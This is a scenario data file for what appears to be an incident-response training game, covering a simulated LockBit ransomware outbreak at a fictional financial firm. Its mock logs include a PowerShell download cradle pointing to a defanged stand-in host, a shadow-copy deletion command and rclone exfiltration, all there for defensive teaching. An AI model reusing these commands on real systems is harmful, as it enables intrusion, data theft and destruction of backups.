// Ransomware Outbreak — LOCKBIT 3.0
// Scenario data for PumaResponse — format documented in README → Development.

// RANSOMWARE: the servers the LockBit encryptor reaches, in order, and the minute of
// the Triage decision at which each falls. Three were already encrypted at handoff;
// the spread stops once the Triage action lands. VEEAM-01 is the backup server.
const RW_SERVERS = ['FS-PROD-01', 'FS-PROD-02', 'FS-PROD-03', 'FS-PROD-04', 'FS-ARCH-01', 'SQL-FIN-01', 'VEEAM-01'];
const RW_SPREAD = [0, 0, 0, 15, 25, 35, 50];
const RW_STAFF = [70, 70, 60, 60, 20, 140, 0]; // employees who lose their work when each server goes
function rwEncrypted(t) { return RW_SPREAD.filter(at => t >= at).length; }
function rwFilesLocked(t) { return 38400 + Math.floor(t * 1450); }
function rwStaff(n) { return RW_STAFF.slice(0, n).reduce((a, b) => a + b, 0); }
function rwJoin(a) { return a.length < 2 ? a.join('') : a.slice(0, -1).join(', ') + ' and ' + a[a.length - 1]; }
function rwNewlyHit(n) { return RW_SERVERS.slice(3, n); }
// Exfiltration is tracked in tenths of a GB so the arithmetic stays exact
function rwGB(tenths) { return (tenths / 10).toFixed(1); }
function rwRecords(tenths) { return Math.round(tenths * 183.2); }
// Can the attacker still talk to the beacons? Primary C2 or the failover host
function rwChannelOpen(f) { return !f.c2Blocked || !f.fallbackBlocked; }
// Hours from the start of Recovery to full operations
function rwRestoreHours(f, how) {
  const n = Math.min(f.serversEncrypted, 6); // VEEAM-01 is rebuilt, not restored
  const per = f.backupLoss ? 14 : 4 / 3;      // WAN pull from object storage vs local repository
  const staged = 4 + Math.ceil(n * per);      // 4-hour canary, then the rest
  let h = how === 'parallel' ? Math.ceil(n * per * (f.backupLoss ? 0.65 : 1))
    : how === 'paid' ? 48 + staged              // negotiation, then a slow, partial decryptor
    : staged;
  if (f.reimaged) h += 72;                    // eradication reimaged the endpoints first
  return h;
}
function rwDuration(h) { return h < 48 ? `${h} hours` : `${(h / 24).toFixed(1)} days`; }
// Wall-clock stamp m minutes after the 03:42 handoff (Feb 19)
function rwStamp(m) {
  const t = 3 * 60 + 42 + Math.floor(m);
  return `Feb ${19 + Math.floor(t / 1440)} ${String(Math.floor(t / 60) % 24).padStart(2, '0')}:${String(t % 60).padStart(2, '0')}`;
}
// When full operations return: recovery started at f.recoveryStartMin and took f.recoveryHours
function rwClockAt(f) {
  return rwStamp(f.recoveryStartMin + f.recoveryHours * 60);
}
// Ways back in the attacker still holds
function rwFoothold(f) {
  const out = [];
  if (f.wmiRemains) out.push('WMI subscription on DC-PROD-01');
  if (!f.svcDisabled) out.push('svc_backup (domain admin) still enabled');
  if (!f.krbtgtReset) out.push('KRBTGT not double-reset');
  if (f.beaconsLeft > 0) out.push(`${f.beaconsLeft} unscoped beacon${f.beaconsLeft === 1 ? '' : 's'}`);
  return out;
}

registerIncident(
  {
    id: 'RANSOMWARE',
    title: 'Ransomware Outbreak — LOCKBIT 3.0',
    client: 'Meridian Financial Group',
    severity: 'CRITICAL',
    sevClass: 'high',
    ticketId: 'IR-2024-0847',
    // In-world "today": every date in this file is written relative to it and
    // shown shifted to the real date (see REAL-DATE ANCHORING in js/game.js)
    baseDate: '2024-02-19',
    assignedTime: '03:42 ET',
    summary: 'Multiple endpoints reporting encrypted files with .lockbit extension. Ransom note detected on 3 file servers. AD environment may be compromised.',
    iocs: [
      { type: 'FILE HASH', val: 'a3b5c7d9e1f2...4a8b (SHA256) — LockBit payload' },
      { type: 'IP', val: '185.220.101.34 — C2 callback' },
      { type: 'IP', val: '91.243.44.12 — exfil staging' },
      { type: 'FILE', val: 'restore-my-files.txt — ransom note' },
      { type: 'PROCESS', val: 'svchost_update.exe — masquerading' },
    ],
    // Run state. Every later phase reads these; choices change them via `sets`.
    initialFlags: {
      serversEncrypted: 3,    // servers LockBit reached (RW_SERVERS order); fixed once Triage acts
      memoryLost: false,      // FS-PROD-01..03 powered off: RAM (injected code, beacon config, key material) gone
      scopeEarly: false,      // Triage log review already found the phishing vector
      backupsSafe: false,     // VEEAM-01 isolated and svc_backup cut off from the repository in Triage
      backupLoss: '',         // '' intact | 'encrypted' (Triage spread) | 'purged' (Containment clock) | 'purgedLater' (DC shutdown left svc_backup live)
      exfilTenths: 23,        // data out to the attacker, tenths of a GB (2.3 GB at handoff)
      svcDisabled: false,     // svc_backup disabled / credential reset
      c2Blocked: false,       // 185.220.101.34 and 91.243.44.12 blocked at the firewall
      fallbackBlocked: false, // beacon failover host update-cdn-sync[.]net blocked
      fallbackLeak: false,    // beacons rolled over to the failover host after Containment
      invLeak: false,         // attacker channel still open after the Investigation
      krbtgtReset: false,     // KRBTGT reset twice — forged golden tickets invalid
      gpoReverted: false,     // Default Domain Policy restored (AV back on)
      dcDown: false,          // DC-PROD-01 powered off in Containment
      wmiRemains: true,       // WMI subscription "SysMaint" on DC-PROD-01 still in place
      wmiKnown: false,        // ...and it is on the eradication list
      hostsKnown: 3,          // compromised hosts the Investigation scoped (of 14)
      beaconsLeft: 0,         // beacons on hosts nobody scoped, after Eradication
      exfilScope: 0,          // 0 never scoped | 1 volume and category | 2 file-level manifest
      reimaged: false,        // Eradication reimaged endpoints (3-day rebuild)
      recoveryHours: 0,       // hours from the start of Recovery to full operations
      ransomPaid: false,
      containedAt: 0,         // wall-clock minute (since handoff) the Containment action landed
      recoveryStartMin: 0,    // wall-clock minute the restore began
    },
    // 2 real seconds per game minute once the decision clock starts; 10-minute par
    clock: { rate: 0.5, par: 10 },
    // Best achievable total (every finding tagged, instant decisions, best path).
    // Grades are a percentage of this. Recompute with tools/scenario-harness.js after
    // changing this scenario's scores, carried penalties or findings.
    bestScore: 333,
    // MITRE ATT&CK (Enterprise v19) technique per finding, shown in the debrief.
    // Findings that aren't adversary behavior (missing controls, business facts) are omitted.
    attack: {
      svcBackupCtx: "T1053.005 Scheduled Task/Job: Scheduled Task",
      lsassInject: "T1055 Process Injection",
      vssDelete: "T1490 Inhibit System Recovery",
      smbLateral: "T1021.002 Remote Services: SMB/Windows Admin Shares",
      beaconC2: "T1071.001 Application Layer Protocol: Web Protocols",
      dcsync: "T1003.006 OS Credential Dumping: DCSync",
      exfilDest: "T1048.002 Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      gpoMod: "T1484.001 Domain or Tenant Policy Modification: Group Policy Modification",
      wmiSub: "T1546.003 Event Triggered Execution: Windows Management Instrumentation Event Subscription",
      fallbackC2: "T1008 Fallback Channels",
      phishXlsm: "T1566.001 Phishing: Spearphishing Attachment",
      stage2: "T1059.001 Command and Scripting Interpreter: PowerShell",
      credTheft: "T1003.001 OS Credential Dumping: LSASS Memory",
      stagingDir: "T1560.001 Archive Collected Data: Archive via Utility",
      c2Live: "T1071.001 Application Layer Protocol: Web Protocols",
    },
    debrief: f => {
      const foot = rwFoothold(f);
      return [
        ['Servers Encrypted', `${f.serversEncrypted} (${RW_SERVERS.slice(0, f.serversEncrypted).join(', ')})`],
        ['Data Exfiltrated', `${rwGB(f.exfilTenths)} GB to attacker infrastructure${f.exfilScope ? '' : ' — never scoped'}`],
        ['Customers Notified', f.exfilScope === 2 ? `${rwRecords(f.exfilTenths).toLocaleString('en-US')} (file-level manifest)`
          : f.exfilScope === 1 ? '38,000 (entire customer base — no manifest)' : 'Late — after the leak-site post'],
        ['Volatile Memory', f.memoryLost ? 'Lost — servers powered off' : 'Preserved'],
        ['Backups', f.backupLoss ? 'Local repository lost — restored from Feb 13 immutable copy' : 'Local repository intact'],
        ['Time to Recover', f.recoveryHours ? rwDuration(f.recoveryHours) : '—'],
        ['Ransom Paid', f.ransomPaid ? '$450,000 (BTC) — sanctions exposure' : 'None'],
        ['Attacker Foothold at Close', foot.length ? `STILL PRESENT — ${foot.join('; ')}` : 'Removed'],
      ];
    },
    phases: [
      { // TRIAGE
        name: 'TRIAGE',
        narrative: 'You receive the handoff at 03:42. The client\'s helpdesk is panicking — three file servers are showing ransom notes and users are reporting they can\'t open files. The night shift SOC analyst flagged it as "suspicious encryption activity" 41 minutes ago but didn\'t escalate.',
        evidence: {
          title: 'INITIAL ALERT — EDR TELEMETRY',
          content: `<span class="log-warn">[03:01:14]</span> <span class="log-highlight">ALERT</span> CrowdStrike — svchost_update.exe executed on FS-PROD-01
<span class="log-warn">[03:01:14]</span>   Parent: taskeng.exe (task "WindowsUpdate") · User: MERIDIAN\\svc_backup<!--f:svcBackupCtx-->
<span class="log-warn">[03:01:18]</span> Process injection detected: svchost_update.exe → lsass.exe<!--f:lsassInject-->
<span class="log-warn">[03:01:40]</span> vssadmin.exe delete shadows /all /quiet — FS-PROD-01<!--f:vssDelete-->
<span class="log-warn">[03:02:05]</span> Veeam agent heartbeat: FS-PROD-01 → VEEAM-01 (OK)
<span class="log-warn">[03:02:44]</span> <span class="log-highlight">CRITICAL</span> Mass file modification: 847 files renamed (.lockbit ext)
<span class="log-warn">[03:03:01]</span> Lateral movement: SMB connection FS-PROD-01 → FS-PROD-02 (svc_backup)<!--f:smbLateral-->
<span class="log-warn">[03:04:12]</span> <span class="log-highlight">CRITICAL</span> Ransom note dropped: C:\\restore-my-files.txt
<span class="log-warn">[03:05:33]</span> Network beacon: 185.220.101.34:443 (every 60s)<!--f:beaconC2-->
<span class="log-warn">[03:07:22]</span> User logon: helpdesk.tier1 → FS-PROD-02 (console) — ticket #44817
<span class="log-warn">[03:09:48]</span> DNS query: ocsp.digicert.com from FS-PROD-03
<span class="log-warn">[03:12:00]</span> <span class="log-highlight">ALERT</span> FS-PROD-03 — encryption activity detected
<span class="log-warn">[03:30:00]</span> Backup agent: FS-PROD-03 job "Nightly-FS" skipped — files locked
<span class="log-warn">[03:42:00]</span> SOC handoff — incident assigned to you`
        },
        choices: [
          {
            key: 'A',
            label: 'Immediately isolate all affected hosts via EDR',
            desc: 'Network-isolate FS-PROD-01, 02, 03 through CrowdStrike. Fast but may alert the attacker.',
            quality: 'good',
            score: { time: 10, containment: 25, evidence: 5, thoroughness: 5 },
            sets: (f, st) => {
              const n = rwEncrypted(st.phaseClock + 2);
              return { serversEncrypted: n, backupLoss: n >= 7 ? 'encrypted' : f.backupLoss };
            },
            outcome: (f, st) => {
              const n = rwEncrypted(st.phaseClock + 2);
              return 'Hosts isolated within 2 minutes via EDR network containment. Encryption stops on isolated systems. The C2 beacon is severed. Some evidence of lateral movement preserved in memory.'
                + (n > 3 ? ` But while you decided, encryption reached ${rwJoin(rwNewlyHit(n))} — ${n} servers encrypted, not 3.` : '')
                + (n >= 7 ? ' VEEAM-01 is one of them: the local backup repository is encrypted.' : '');
            },
          },
          {
            key: 'B',
            label: 'Review logs first to understand full scope before acting',
            desc: 'Spend 15-20 minutes analyzing SIEM data and EDR telemetry to map the blast radius.',
            quality: 'partial',
            score: { time: -15, containment: -10, evidence: 15, thoroughness: 15 },
            // The review itself takes 18 minutes before anything is isolated
            sets: (f, st) => {
              const n = rwEncrypted(st.phaseClock + 18);
              return { serversEncrypted: n, scopeEarly: true, exfilTenths: f.exfilTenths + 4, backupLoss: n >= 7 ? 'encrypted' : f.backupLoss };
            },
            outcome: (f, st) => {
              const n = rwEncrypted(st.phaseClock + 18);
              const hit = rwNewlyHit(n);
              return 'You identify 2 additional compromised workstations and the initial access vector (phishing email to jsmith@meridian.com). However, during analysis, encryption spreads to '
                + (hit.length === 1 ? 'a 4th file server (FS-PROD-04)' : `${hit.length} more servers (${rwJoin(hit)})`)
                + ' and the attacker begins staging data for exfiltration — another 0.4 GB goes out to 91.243.44.12 before the hosts are isolated.'
                + (n >= 7 ? ' VEEAM-01 is among the encrypted: the local backup repository is gone.' : '');
            },
          },
          {
            key: 'C',
            label: 'Call the client IT team and ask them to pull network cables',
            desc: 'Have the client physically disconnect affected servers from the network.',
            quality: 'bad',
            score: { time: -10, containment: 10, evidence: -20, thoroughness: -5 },
            sets: (f, st) => {
              const n = rwEncrypted(st.phaseClock + 12);
              return { serversEncrypted: n, memoryLost: true, backupLoss: n >= 7 ? 'encrypted' : f.backupLoss };
            },
            outcome: (f, st) => {
              const n = rwEncrypted(st.phaseClock + 12);
              const hit = rwNewlyHit(n);
              return 'The IT team takes 12 minutes to reach the data center. They power off servers instead of just disconnecting — volatile memory evidence is lost. The code injected into lsass, the beacon\'s in-memory configuration and any chance at in-flight encryption keys go with it, and files caught mid-encryption are left corrupted.'
                + (hit.length ? ` The walk costs more than evidence: ${rwJoin(hit)} ${hit.length === 1 ? 'is' : 'are'} encrypted before the power goes off.` : '')
                + (n >= 7 ? ' That includes VEEAM-01 and its local backup repository.' : '')
                + ' Encryption was stopped but forensic artifacts in RAM are gone.';
            },
          },
          {
            key: 'D',
            when: f => f.saw_vssDelete || f.saw_svcBackupCtx,
            label: 'Isolate the hosts via EDR and cut svc_backup off from the backup server',
            desc: 'EDR-contain the encrypting servers and VEEAM-01 too — the encryptor is running as the account that owns the backups.',
            quality: 'good',
            score: { time: 10, containment: 30, evidence: 5, thoroughness: 10 },
            sets: (f, st) => {
              const n = rwEncrypted(st.phaseClock + 3);
              return { serversEncrypted: n, backupsSafe: n < 7, backupLoss: n >= 7 ? 'encrypted' : f.backupLoss };
            },
            outcome: (f, st) => {
              const n = rwEncrypted(st.phaseClock + 3);
              return 'Hosts isolated within 3 minutes via EDR network containment; encryption stops on isolated systems and the C2 beacon is severed. Memory stays intact.'
                + (n > 3 ? ` Encryption had already reached ${rwJoin(rwNewlyHit(n))} — ${n} servers encrypted.` : '')
                + (n >= 7
                  ? ' But VEEAM-01 was already encrypted — the restore points you moved to protect are gone.'
                  : ' Meridian\'s backup admin puts VEEAM-01 under network containment with only his console path allowed, and strips svc_backup of its rights in Veeam. Whoever holds svc_backup can no longer touch the restore points.');
            },
          },
        ],
        live: (f, st) => `ENCRYPTED: ${rwEncrypted(st.phaseClock)} SERVERS · ${rwFilesLocked(st.phaseClock).toLocaleString('en-US')} FILES LOCKED`,
        timeline: [
          { at: 5, sev: 'warn', text: 'FS-PROD-02: SMB session to \\\\FS-PROD-04\\Finance$ opened as svc_backup', score: { containment: -3 } },
          { at: 15, sev: 'crit', text: 'FS-PROD-04 — encryption activity detected (4 servers)', score: { containment: -3 } },
          { at: 25, sev: 'crit', text: 'FS-ARCH-01 — archive shares encrypting (5 servers)', score: { containment: -3 } },
          { at: 35, sev: 'crit', text: 'SQL-FIN-01 — loan-servicing database files renamed .lockbit (6 servers)', score: { containment: -5 } },
          { at: 50, sev: 'crit', text: 'VEEAM-01 — local backup repository encrypted (7 servers)', score: { containment: -5 } },
        ],
        siemEntries: [
          { time: '03:42', sev: 'crit', text: 'INCIDENT ASSIGNED — Ransomware — Meridian Financial' },
          { time: '03:42', sev: 'warn', text: 'SLA CLOCK STARTED — P1 response: 15 min target' },
          { time: '03:43', sev: 'info', text: 'Pulling EDR telemetry for FS-PROD-01..03' },
          { time: '03:43', sev: 'crit', text: 'Active encryption detected — files still being modified' },
        ],
      },
      { // CONTAINMENT
        name: 'CONTAINMENT',
        carried: f => {
          const out = [];
          if (f.serversEncrypted > 3) out.push({
            text: `LockBit reached ${f.serversEncrypted} servers, not 3: ${rwJoin(rwNewlyHit(f.serversEncrypted))} ${f.serversEncrypted === 4 ? 'was' : 'were'} encrypted before the spread stopped. About ${rwStaff(f.serversEncrypted)} employees are now without their files.`,
            score: { containment: -Math.min(8, 2 * (f.serversEncrypted - 3)) },
          });
          if (f.backupLoss === 'encrypted') out.push({
            text: 'VEEAM-01 is encrypted. Every local restore point is gone; only the weekly immutable copy in object storage is left.',
            score: { thoroughness: -5 },
          });
          if (f.memoryLost) out.push({
            text: 'FS-PROD-01..03 were powered off. Whatever the injected code in lsass and the in-memory beacon held — C2 configuration, credentials in use, key material — no longer exists.',
          });
          if (f.backupsSafe) out.push({
            sev: 'good',
            text: 'VEEAM-01 is isolated and svc_backup has no rights on the repository. The restore points are out of the attacker\'s reach.',
          });
          if (f.scopeEarly) out.push({
            sev: 'info',
            text: 'Your log review already tied the intrusion to a phishing email to jsmith on Feb 14.',
          });
          return out;
        },
        narrative: f => [
          'Initial triage is complete.',
          f.memoryLost
            ? 'FS-PROD-01 through 03 are dark — powered off, not unplugged, so there is no memory left to capture.'
            : 'FS-PROD-01 through 03 are isolated but still running; their memory can still be pulled over EDR.',
          f.backupsSafe ? 'VEEAM-01 is off the network and svc_backup has no rights on the repository.'
            : f.backupLoss === 'encrypted' ? 'VEEAM-01, the backup server, went down with the file servers.' : '',
          'You need to contain the threat and prevent further spread. The attacker has a foothold in Active Directory — a service account (svc_backup) was compromised and used for lateral movement. The C2 is beaconing to 185.220.101.34.',
        ].filter(Boolean).join(' '),
        evidence: {
          title: 'LATERAL MOVEMENT ANALYSIS',
          content: (f, st) => `<span class="log-warn">[Feb 18 02:14]</span> Successful auth: svc_backup → DC-PROD-01 (Kerberos)
<span class="log-warn">[Feb 18 02:15]</span> <span class="log-highlight">DCSync</span> detected from svc_backup — domain password hashes replicated, incl. KRBTGT<!--f:dcsync-->
<span class="log-warn">[Feb 18 02:16]</span> LDAP query burst: svc_backup enumerated 4,118 user objects
<span class="log-warn">[Feb 18 02:18]</span> PsExec execution: DC-PROD-01 → FS-PROD-01 (svc_backup)
<span class="log-warn">[Feb 18 02:19]</span> Scheduled task created: "WindowsUpdate" → svchost_update.exe
<span class="log-warn">[Feb 18 02:22]</span> rclone.exe (renamed wuauclt_helper.exe) → 91.243.44.12:443 — 2.3 GB transferred<!--f:exfilDest-->
<span class="log-warn">[Feb 18 02:30]</span> DNS query: time.windows.com from FS-PROD-01
<span class="log-warn">[Feb 18 06:00]</span> Veeam job "Nightly-FS" completed as svc_backup — 3 restore points
<span class="log-warn">[Feb 19 02:40]</span> RDP logon: svc_backup → DC-PROD-01 from FS-PROD-01
<span class="log-warn">[Feb 19 02:45]</span> <span class="log-highlight">GPO MODIFIED</span> — Default Domain Policy (disable AV)<!--f:gpoMod-->
<span class="log-warn">[Feb 19 02:47]</span> WMI-Activity 5861: permanent subscription "SysMaint" — CommandLineEventConsumer on DC-PROD-01<!--f:wmiSub-->
<span class="log-warn">[Feb 19 02:52]</span> Windows Update: KB5034770 install failed (0x800f0922) — DC-PROD-02
<span class="log-warn">[Feb 19 03:01]</span> Encryption routine triggered via scheduled task
${f.memoryLost
  ? `<span class="log-warn">[${rwStamp(st.elapsed + 11)}]</span> RTR memory capture FS-PROD-01: FAILED — host offline (powered down)`
  : `<span class="log-ok">[${rwStamp(st.elapsed + 11)}]</span> RTR memory capture FS-PROD-01: in-memory beacon config — C2 185.220.101.34, failover update-cdn-sync[.]net<!--f:fallbackC2-->`}`
        },
        choices: [
          {
            key: 'A',
            label: 'Disable svc_backup, block C2 IPs at firewall, start the KRBTGT double reset',
            desc: 'Full containment: kill the compromised account, block exfil, and begin invalidating Kerberos tickets — first KRBTGT reset now, the second once replication has converged.',
            quality: 'good',
            score: { time: 10, containment: 25, evidence: 10, thoroughness: 15 },
            sets: (f, st) => ({
              containedAt: st.elapsed,
              svcDisabled: true, c2Blocked: true, krbtgtReset: true, gpoReverted: true,
              // Cobalt Strike rotates to its failover host when the primary goes dark
              fallbackBlocked: !!f.saw_fallbackC2,
              fallbackLeak: !f.saw_fallbackC2,
              exfilTenths: f.exfilTenths + (f.saw_fallbackC2 ? 0 : 6),
            }),
            outcome: f => 'Comprehensive containment executed. The attacker\'s access is severed at multiple points. KRBTGT is reset once now, with the second reset scheduled for after replication converges — back to back, the pair would strand every live ticket in the domain, and forged golden tickets only die on the second. Firewall rules block C2 and exfil IPs. The GPO change is reverted.'
              + (f.saw_fallbackC2 ? ' The block list also carries update-cdn-sync[.]net, the failover host from the memory capture — without it the beacons would simply have rolled over.' : '')
              + (f.backupLoss === 'purged' ? ' svc_backup is disabled — but only after it had emptied the local Veeam repository.' : ''),
          },
          {
            key: 'B',
            label: 'Block C2 IPs at firewall and disable the compromised account',
            desc: 'Standard containment — block network indicators and lock the account.',
            quality: 'partial',
            score: { time: 5, containment: 10, evidence: 5, thoroughness: 5 },
            sets: (f, st) => ({
              containedAt: st.elapsed,
              svcDisabled: true, c2Blocked: true,
              fallbackBlocked: !!f.saw_fallbackC2,
              fallbackLeak: !f.saw_fallbackC2,
              exfilTenths: f.exfilTenths + (f.saw_fallbackC2 ? 0 : 6),
            }),
            outcome: f => 'C2 communications blocked and svc_backup disabled.'
              + (f.saw_fallbackC2 ? ' The block includes the failover host you pulled from memory, update-cdn-sync[.]net.' : '')
              + (f.backupLoss === 'purged' ? ' The account is locked — after it had already purged the local Veeam repository.' : '')
              + ' However, you didn\'t reset KRBTGT — the attacker may have forged golden tickets that remain valid. The modified GPO is still in place, leaving AV disabled across the domain.',
          },
          {
            key: 'C',
            label: 'Shut down the domain controller to stop the bleeding',
            desc: 'Power off DC-PROD-01 to prevent any further AD compromise.',
            quality: 'bad',
            score: { time: -20, containment: 5, evidence: -15, thoroughness: -10 },
            sets: (f, st) => ({
              containedAt: st.elapsed,
              dcDown: true,
              exfilTenths: f.exfilTenths + 8,
              // svc_backup is still valid on DC-PROD-02 and still owns the backups
              backupLoss: f.backupLoss || (f.backupsSafe ? '' : 'purgedLater'),
            }),
            outcome: 'Shutting down the DC causes authentication failures across the entire environment. Employees can\'t log in, business operations halt. The backup DC takes over but still has the compromised GPO. Memory forensics on the primary DC are lost. Nothing was blocked at the firewall, and svc_backup was never touched.',
          },
          {
            key: 'D',
            when: f => f.saw_wmiSub,
            label: 'Full containment, and pull the WMI subscription off DC-PROD-01 first',
            desc: 'Remove the "SysMaint" filter, consumer and binding, then disable svc_backup, block C2 and exfil, start the KRBTGT double reset, revert the GPO.',
            quality: 'good',
            score: { time: 10, containment: 30, evidence: 10, thoroughness: 20 },
            sets: (f, st) => ({
              containedAt: st.elapsed,
              svcDisabled: true, c2Blocked: true, krbtgtReset: true, gpoReverted: true, wmiRemains: false, wmiKnown: true,
              fallbackBlocked: !!f.saw_fallbackC2,
              fallbackLeak: !f.saw_fallbackC2,
              exfilTenths: f.exfilTenths + (f.saw_fallbackC2 ? 0 : 6),
            }),
            outcome: f => 'You export the "SysMaint" event filter, consumer and binding for evidence, then delete all three — the attacker\'s way back onto the DC is gone before you touch anything they would notice. svc_backup disabled, C2 and exfil IPs blocked, first KRBTGT reset done and the second scheduled behind replication, GPO reverted.'
              + (f.saw_fallbackC2 ? ' The block list carries the failover host from the memory capture, update-cdn-sync[.]net, too.' : '')
              + (f.backupLoss === 'purged' ? ' svc_backup is disabled — but only after it had emptied the local Veeam repository.' : ''),
          },
        ],
        live: f => `EXFIL OUT: ${rwGB(f.exfilTenths)} GB · BACKUPS: ${f.backupLoss ? 'LOST' : f.backupsSafe ? 'ISOLATED' : 'REACHABLE BY SVC_BACKUP'}`,
        timeline: [
          { at: 5, sev: 'crit', text: 'rclone: WS-FIN-07 → 91.243.44.12 — upload resumed from C:\\ProgramData\\WindowsUpdate\\',
            sets: f => ({ exfilTenths: f.exfilTenths + 3 }), score: { containment: -3 } },
          { at: 9, when: f => !f.backupsSafe && !f.backupLoss, sev: 'warn', text: 'VEEAM-01: console logon as svc_backup from WS-FIN-07', score: { containment: -3 } },
          { at: 14, when: f => !f.backupsSafe && !f.backupLoss, sev: 'crit', text: 'VEEAM-01: 43 restore points deleted — local repository purged',
            sets: { backupLoss: 'purged' }, score: { containment: -5 } },
          { at: 20, sev: 'crit', text: 'rclone: second batch — \\\\FS-PROD-05\\HR$ → 91.243.44.12',
            sets: f => ({ exfilTenths: f.exfilTenths + 5 }), score: { containment: -3 } },
        ],
        siemEntries: f => [
          { time: '03:55', sev: 'warn', text: 'DCSync activity confirmed — svc_backup replicated domain password hashes' },
          { time: '03:56', sev: 'crit', text: 'GPO modification detected — AV disabled domain-wide' },
          { time: '03:57', sev: 'info', text: `${rwGB(f.exfilTenths)} GB data exfiltrated to 91.243.44.12 before containment` },
        ],
      },
      { // INVESTIGATION
        name: 'INVESTIGATION',
        carried: f => {
          const out = [];
          if (f.backupLoss === 'purgedLater') out.push({
            text: `${rwStamp(f.containedAt + 35)} — svc_backup, never disabled, authenticated through DC-PROD-02 to VEEAM-01 and deleted every local restore point.`,
            score: { containment: -10 },
          });
          if (!f.c2Blocked) out.push({
            text: 'With nothing blocked at the firewall, beacons on 11 un-isolated hosts kept checking in to 185.220.101.34 — and rclone pushed another 0.8 GB to 91.243.44.12.',
            score: { containment: -10 },
          });
          if (f.fallbackLeak) out.push({
            text: `${rwStamp(f.containedAt + 15)} — once 185.220.101.34 went dark, the beacons on the un-isolated workstations rolled over to their failover host, update-cdn-sync[.]net, which nobody blocked. Another 0.6 GB left through it.`,
            score: { containment: -5 },
          });
          if (f.dcDown) out.push({
            sev: 'info',
            text: 'DC-PROD-01 is still down. DC-PROD-02 is carrying authentication and the help desk has 140 lockout tickets.',
          });
          if (!f.gpoReverted) out.push({
            text: 'The modified Default Domain Policy is still applied: AV is off on every domain-joined machine.',
            score: { containment: -3 },
          });
          return out;
        },
        narrative: f => [
          f.dcDown ? 'DC-PROD-01 is off and nothing is blocked at the firewall — such containment as you have is the outage.' : 'Containment measures are in place.',
          f.scopeEarly ? 'Your triage review already found the phishing email to jsmith; now confirm everything that followed it.' : '',
          'Now you need to determine the full scope: initial access vector, all compromised systems, data exfiltrated, and persistence mechanisms. The client\'s CISO is asking for a preliminary impact assessment.',
        ].filter(Boolean).join(' '),
        evidence: {
          title: 'EMAIL GATEWAY LOGS + ENDPOINT FORENSICS',
          content: f => `<span class="log-warn">[Feb 14 08:57]</span> Email received: jsmith@meridian.com — "Weekly Market Brief" (newsletter)
<span class="log-warn">[Feb 14 09:12]</span> Email received: jsmith@meridian.com<!--f:phishXlsm-->
  From: invoice@docusign-secure.net (spoofed)<!--f:phishXlsm-->
  Attachment: Q4_Invoice_Final.xlsm (macro-enabled)<!--f:phishXlsm-->
<span class="log-warn">[Feb 14 09:14]</span> <span class="log-highlight">Macro executed</span> — PowerShell download cradle<!--f:stage2-->
  powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).<!--f:stage2-->
  DownloadString('hxxps://cdn-update[.]com/stage2.ps1')"<!--f:stage2-->
<span class="log-warn">[Feb 14 09:15]</span> Cobalt Strike beacon established → 185.220.101.34<!--f:stage2-->
<span class="log-warn">[Feb 14 09:18]</span> OneDrive sync client: 214 files synced — WS-JSMITH
<span class="log-warn">[Feb 14 09:22]</span> Credential harvesting: Mimikatz on WS-JSMITH<!--f:credTheft-->
<span class="log-warn">[Feb 14 10:40]</span> Windows Update: 3 updates installed — WS-JSMITH (reboot pending)
<span class="log-warn">[Feb 14 11:00]</span> Privilege escalation: jsmith → svc_backup (pass-the-hash)<!--f:credTheft-->
<span class="log-warn">[Feb 16 18:05]</span> VPN logon: jsmith from residential ISP (matches 90-day baseline)
<span class="log-warn">[Feb 17 23:40]</span> 7z.exe: 1,912 files archived into C:\\ProgramData\\WindowsUpdate\\ — FS-PROD-02<!--f:stagingDir-->${f.fallbackLeak ? `
<span class="log-warn">[${rwStamp(f.containedAt + 16)}]</span> WS-FIN-07: beacon DNS lookups → update-cdn-sync[.]net, HTTPS every 60s<!--f:fallbackC2-->` : ''}${!f.c2Blocked ? `
<span class="log-warn">[${rwStamp(f.containedAt + 20)}]</span> Beacon check-ins continue: 11 hosts → 185.220.101.34 (no firewall block)<!--f:c2Live-->` : ''}
<span class="log-ok">[FORENSIC NOTE]</span> Exfil staging directory: C:\\ProgramData\\WindowsUpdate\\<!--f:stagingDir-->`
        },
        choices: [
          {
            key: 'A',
            label: 'Full forensic triage: image affected systems, analyze timeline, document IOCs',
            desc: 'Systematic forensic analysis of all 14 affected systems. Thorough but time-intensive.',
            quality: 'good',
            score: { time: -5, containment: 5, evidence: 25, thoroughness: 20 },
            sets: { hostsKnown: 14, wmiKnown: true, exfilScope: 1, fallbackBlocked: true, c2Blocked: true },
            outcome: f => `Comprehensive forensic analysis reveals the complete attack timeline from phishing to encryption (5-day dwell time). You identify all 14 compromised systems, 3 persistence mechanisms (scheduled tasks, WMI subscriptions, registry run keys), and confirm ${rwGB(f.exfilTenths)} GB of financial data was exfiltrated. Findings documented with proper chain of custody.`
              + (f.memoryLost ? ' The powered-off file servers contribute disk images only; their share of the timeline is rebuilt from event logs.' : '')
              + (!f.fallbackBlocked ? ' Static analysis of the imaged beacon.exe extracts its full C2 profile — including the failover host update-cdn-sync[.]net, which nobody had blocked. It is blocked now.' : '')
              + (!f.c2Blocked ? ' You also get 185.220.101.34 and 91.243.44.12 blocked at the firewall at last.' : ''),
          },
          {
            key: 'B',
            label: 'Focus on IOC sweeps across the environment using EDR',
            desc: 'Use CrowdStrike to hunt for known IOCs across all endpoints. Fast but may miss novel artifacts.',
            quality: 'partial',
            score: { time: 10, containment: 5, evidence: 10, thoroughness: 10 },
            sets: f => {
              const fb = f.fallbackBlocked || !!f.saw_fallbackC2;
              return { hostsKnown: 11, wmiKnown: f.wmiKnown || !!f.saw_wmiSub, exfilScope: 1, c2Blocked: true, fallbackBlocked: fb, invLeak: !fb, exfilTenths: f.exfilTenths + (fb ? 0 : 5) };
            },
            outcome: f => 'EDR IOC sweep identifies 11 of 14 compromised systems. '
              + (!f.wmiRemains ? 'You find the primary persistence mechanisms; the WMI subscription on DC-PROD-01 is already gone.'
                : f.saw_wmiSub ? 'You find the primary persistence mechanisms, and the WMI subscription on DC-PROD-01 is on your list only because you tagged it during containment.'
                : 'You find the primary persistence mechanisms but miss a WMI event subscription that could allow re-entry.')
              + ' The exfiltrated data volume is confirmed but specific files aren\'t catalogued.'
              + (!f.fallbackBlocked && f.saw_fallbackC2 ? ' The sweep list includes update-cdn-sync[.]net, the failover host you tagged — blocked.' : ''),
          },
          {
            key: 'C',
            label: 'Check only the initially reported file servers and call it scoped',
